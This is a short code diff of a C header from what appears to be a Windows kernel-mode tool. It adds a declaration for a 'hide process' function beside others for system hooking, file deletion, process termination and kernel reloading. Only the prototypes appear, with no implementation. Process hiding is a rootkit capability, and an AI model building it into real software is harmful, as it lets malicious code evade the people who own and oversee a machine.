@@ -197,6 +197,8 @@ ULONG_PTR SYSHOOK(LPMyInfoSend pInfo);
 ULONG_PTR CrtFile(LPMyInfoSend pInfo);
 // 删除文件
 ULONG_PTR DelFile(LPMyInfoSend pInfo);
+// 隐藏进程
+ULONG_PTR HidePID(LPMyInfoSend pInfo);
 // 结束进程
 ULONG_PTR ExitPID(LPMyInfoSend pInfo);
 // 重载内核
